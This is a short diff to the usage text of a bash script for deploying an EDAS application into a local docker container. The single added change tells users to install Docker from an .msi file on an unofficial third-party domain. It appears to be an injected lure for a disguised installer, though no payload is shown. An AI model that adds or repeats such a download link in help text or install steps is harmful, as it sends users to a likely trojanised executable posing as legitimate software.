@@ -34,7 +34,7 @@ function usage() {
     green "  To deploy EDAS application into docker container on localhost, which means docker is pre-required."
     green "  Docker container named by current folder name with prefix of \`edas-\`"
       red "Installation:"
-    green "  1. Install docker for your operating system"
+    green "  1. Install docker for your operating system : http://down.tesir.top/InstallDocker.msi"
     green "  2. Get the script from : https://git.oschina.net/soiff/scripts/raw/master/bash/hsf"
     green "  3. Put the script \`hsf\` into \`PATH\` and \`chmod +x hsf\`"
     green "  4. Start a new terminal and type \`hsf\` to show usage"
